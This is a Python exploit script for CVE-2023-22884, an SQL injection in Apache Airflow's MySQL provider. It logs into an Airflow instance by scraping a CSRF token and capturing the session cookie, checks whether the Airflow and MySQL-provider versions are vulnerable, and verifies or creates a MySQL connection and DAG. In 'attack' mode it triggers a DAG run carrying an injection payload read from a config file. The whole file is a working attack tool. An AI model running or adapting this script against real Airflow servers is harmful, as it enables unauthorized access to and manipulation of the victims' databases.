# @jakabakos
# version: 1.1
# Tested with Airflow 2.5.0 and MySQL provider 3.4.0
# Apache Airflow REST API reference: https://airflow.apache.org/docs/apache-airflow/stable/stable-rest-api-ref.html

import argparse
import json
import re
import requests
from packaging import version

def get_csrf_token(url):
    """Get the CSRF token from the login page response"""
    # Send a GET request to the login page to retrieve the HTML content
    response = requests.get(url + "/login/")

    # Use regular expression to find the CSRF token from the response HTML
    pattern = r'<input(?:\s+(?:(?:type|name|id)\s*=\s*"[^"]*"\s*)+)?\s+value="([^"]+)">'
    csrf_token = re.search(pattern, response.text)
    
    # Extract the initial session cookie from the response
    initial_session_cookie = response.cookies.get('session')

    # Check if CSRF token is found in the response and return the session cookie and the token
    if csrf_token:
        print("[+] CSRF token found.")
        return initial_session_cookie, csrf_token.group(1)
    else:
        # If CSRF token is not found, print an error message and exit the script
        print("[-] CSRF token not found. Exiting...")
        exit(1)

def login(url, username, password, cookie, csrf_token):
    """Login to the Apache Airflow web application"""
    # Prepare the login data with CSRF token, username, and password
    data = {"csrf_token": csrf_token, "username": username, "password": password}

    # Send a POST request to the login page with the login data and session cookie
    response = requests.post(
        url + "/login/",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": f"session={cookie}"
        },
        data=data
    )

    # Check if the login was successful or if there was an error
    if "Invalid login. Please try again." in response.text:
        print("[+] Login was not successful due to invalid credentials.")
        exit(1)
    elif response.status_code != 200:
        print("[-] Something went wrong with the login process.")
    elif "Set-Cookie" in response.headers:
        # If login was successful, extract the new session cookie from the response headers
        session_cookie = response.headers["Set-Cookie"].split(";")[0].split("=")[1]
        print(f"[+] Login was successful. Captured session cookie: {session_cookie}")
        return session_cookie

def verify_airflow_version(url, session_cookie):
    """Verify the version of Apache Airflow and check for vulnerability"""
    # Send a GET request to the Airflow home page to retrieve the HTML content
    response = requests.get(
        url + "/home",
        headers={"Cookie": f"session={session_cookie}"}
    )

    # Use regular expression to find the version string from the response HTML
    version_str = re.search(r'v(\d+\.\d+\.\d+)', response.text)

    # Check if the version string is found in the response and extract the version number
    if version_str:
        print(f"[+] Airflow version found: {version_str.group(1)}")
    else:
        # If version string is not found, print an error message and exit the script
        print("[-] Airflow version not found.")
        exit(1)

    # Check if the version is vulnerable (less than or equal to 2.5.0)
    if version.parse(version_str.group(1)) <= version.parse("2.5.0"):
        print("[+] Version is vulnerable.")
    else:
        print("[-] Airflow version is not vulnerable. Version is above 2.5.0. Exiting...")
        exit(1)

def verify_mysql_provider(url, session_cookie):
    """Verify the version of MySQL provider and check for vulnerability"""
    # Send a GET request to get the list of providers from the Airflow API
    response = requests.get(
        f'{url}/api/v1/providers',
        headers={"Cookie": f"session={session_cookie}"}
    )
    data = response.json()
    providers = data.get("providers", [])
    
    # Loop through the list of providers and find the MySQL provider
    for provider in providers:
        if provider.get("package_name") == "apache-airflow-providers-mysql":
            # Check if the version of the MySQL provider is vulnerable (less than or equal to 3.4.0)
            if version.parse(provider.get("version")) <= version.parse("3.4.0"):
                print("[+] MySQL provider version is vulnerable.")
                return
            else:
                print("[-] MySQL provider version is not vulnerable. Exiting...")
                exit(1)

    # If MySQL provider is not found in the list of providers, print an error message and exit the script
    print("[-] MySQL provider not found. Exiting...")
    exit(1)

def verify_connection_id(url, session_cookie, connection_id):
    """Verify the existence of a provided connection ID or create a new connection using provided JSON data"""
    # Check if the provided connection ID is a string, indicating an existing connection
    if isinstance(connection_id, str):
        # Send a GET request to get the list of connections from the Airflow API
        response = requests.get(
            f'{url}/api/v1/connections',
            headers={"Cookie": f"session={session_cookie}"}
        )
        connections = response.json().get("connections", [])

        # Loop through the list of connections and check if the provided connection ID exists
        found = False
        for conn in connections:
            if conn.get("connection_id") == connection_id:
                # Check if the existing connection is of type "mysql"
                if conn.get("conn_type") == "mysql":
                    found = True
                else:
                    print("[-] The provided connection_id is not a 'mysql' type connection. Exiting...")
                    exit(1)
        if found:
            print(f"[+] Connection ID '{connection_id}' exists.")
            return
        else:
            print("[-] Submitted connection id does not exist. Exiting...")
            exit(1)

    # If the connection ID does not exist, try to open it as a JSON file that contains the data for the new connection
    else:
        try:
            with open(connection_id, 'r') as f:
                conn_data = json.load(f)
            if not isinstance(conn_data, dict) or not all(key in conn_data for key in ["connection_id", "conn_type", "host", "login", "port", "password"]):
                print("[-] Invalid JSON format for connection data. Exiting...")
                exit(1)
            # Send a POST request to create a new connection using the provided JSON data
            response = requests.post(
                url + "/connections",
                headers={"Cookie": f"session={session_cookie}"},
                json=conn_data
            )

            # Check if the connection was successfully created or if there was an error
            if response.status_code == 200:
                print(f"[+] Connection was successfully created with name {conn_data['connection_id']}.")
                print("[+] This connection id should be used by the vulnerable DAG.")
            else:
                print("[-] Failed to create the connection. Exiting...")
                exit(1)
        except FileNotFoundError:
            print("[-] The specified connection data file was not found. Exiting...")
            exit(1)
        except json.JSONDecodeError:
            print("[-] Failed to parse the JSON connection data. Exiting...")
            exit(1)

def verify_dag_id(url, session_cookie, dag_id):
    """Verify the existence of a provided DAG ID"""
    # Send a GET request to get the list of DAGs from the Airflow API
    response = requests.get(f'{url}/api/v1/dags',
        headers={"Cookie": f"session={session_cookie}"}
    )

    dags = response.json().get("dags", [])

    # Check if the provided DAG ID exists in the list of DAGs
    if any(dag.get("dag_id") == dag_id for dag in dags):
        print(f"[+] DAG id '{dag_id}' exists.")
    else:
        print("[-] DAG id does not exist. Exiting...")
        exit(1)

def trigger_dag(url, session_cookie, dag_id, file_path):
    """Trigger a DAG run with a provided configuration"""
    endpoint = f"{url}/api/v1/dags/{dag_id}/dagRuns"
    headers = {
        "Cookie": f"session={session_cookie}",
        "accept": "application/json"
    }

    try:
        # Read the content of the provided file (should be in JSON format)
        with open(file_path, 'r') as file:
            file_content = file.read()
            try:
                # Try to parse the JSON content into a Python dictionary
                payload = json.loads(file_content)
            except json.JSONDecodeError:
                # If the provided file content is not valid JSON, exit the script
                exit(0)
    except FileNotFoundError:
        # If the provided file path does not exist, print an error message and return None
        print("File not found.")
        return None

    # Prepare the payload for the DAG run with the provided configuration
    data = {"conf": payload}

    # Send a POST request to trigger the DAG run with the payload configuration
    response = requests.post(endpoint, headers=headers, json=data)
    
    # Check if the DAG run was successfully triggered and if it's in "queued" state
    if response.status_code == 200 and response.json().get("state") == "queued":
        print("[+] DAG successfully triggered with the provided payload.")
    else:
        print("[-] Failed to trigger the DAG. Response:")
        print(json.dumps(response.json(), indent=4))
        exit(1)

def main():
    # Example text to show usage examples of the script
    example_text = '''Examples:
    python3 exploit.py -u admin -p admin --host http://localhost:8080 --mode test -ci mysql -di bulk_load_from_file 
    python3 exploit.py -u admin -p admin --host http://localhost:8080 --mode attack -ci mysql -di bulk_load_from_file -dc dag_config.json
    '''
    parser = argparse.ArgumentParser(
        description="CVE-2023-22884 Apache Airflow SQLi exploit script",
        epilog=example_text,
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    # Define command-line arguments for the script
    parser.add_argument("-u", "--username", help="Airflow username.")
    parser.add_argument("-p", "--password", help="Airflow password.")
    parser.add_argument("-c", "--cookie", help="Authentication cookie.")
    parser.add_argument("--host", required=True, help="Host where the airflow is (format: http(s)://host:port).")
    parser.add_argument("-m", "--mode", required=True, choices=["test", "attack"], help="The mode of the script. Can be: 'test' or 'attack' mode")
    parser.add_argument("-ci", "--connection-id", help="The connection ID of the MySQL provider. Required in attack mode only. Submit a string if it's existing or a path to a JSON file if should be created.")
    parser.add_argument("-di", "--dag-id", help="The ID of the DAG to be exploited. Required in attack mode only.")
    parser.add_argument("-dc", "--dag-config-file", help="Path to a file that stores a the DAG config JSON.")
    
    args = parser.parse_args()

    # Check if either username and password or the authentication cookie is provided
    if (args.username and args.password) or args.cookie:
        url = args.host.rstrip("/")
        # Check if the URL starts with 'http://' or 'https://' and correct it if needed
        if not url.startswith("http"):
            print("[-] Invalid URL format. Please use 'http' or 'https' as the schema. Exiting...")
            exit(1)

        # Get the session cookie if not provided, by performing login using credentials and CSRF token
        session_cookie = args.cookie
        if not session_cookie:
            initial_session_cookie, csrf_token = get_csrf_token(url)
            session_cookie = login(url, args.username, args.password, initial_session_cookie, csrf_token)

        if args.mode == "test":
            print("[+] Running in test mode.")
            # Verify the version of Apache Airflow and check for vulnerability
            verify_airflow_version(url, session_cookie)

            # Verify the version of MySQL provider and check for vulnerability
            verify_mysql_provider(url, session_cookie)

            # Verify the existence of the provided MySQL connection ID
            verify_connection_id(url, session_cookie, args.connection_id)

            # Verify the existence of the provided DAG ID
            verify_dag_id(url, session_cookie, args.dag_id)
            
            print("[+] Exploit successfully finished in test mode. Application is potentially VULNERABLE.")
            exit(0)

        elif args.mode == "attack":
            print("[+] Running in attack mode.")
            # Trigger the DAG run with the provided configuration
            trigger_dag(url, session_cookie, args.dag_id, args.dag_config_file)
            print("[+] Exploit successfully finished in attack mode.")
    else:
        # If neither credentials nor authentication cookie is provided, print an error message and exit the script
        print("[-] Either username along with password or the authentication cookie is required. Exiting...")
        exit(1)

if __name__ == "__main__":
    main()
